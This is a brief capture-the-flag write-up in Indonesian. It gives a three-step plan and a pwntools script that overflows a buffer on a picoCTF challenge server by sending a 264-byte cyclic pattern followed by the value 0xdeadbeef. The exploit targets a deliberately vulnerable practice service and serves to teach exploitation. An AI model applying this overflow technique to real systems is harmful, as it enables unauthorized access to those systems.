## Rencana
* Ambill offset
* Tambahkan bytes 0xdeadbeef di akhir
* kirim

## Payload
```
from pwn import *

pattern = cyclic(300)  # Generate 300 bytes pattern

payload = pattern

offset = 264
payload = flat([
    cyclic(offset),
    p32(0xdeadbeef)
])
p = remote('mars.picoctf.net', 31890)
p.sendline(payload)

p.interactive()

```
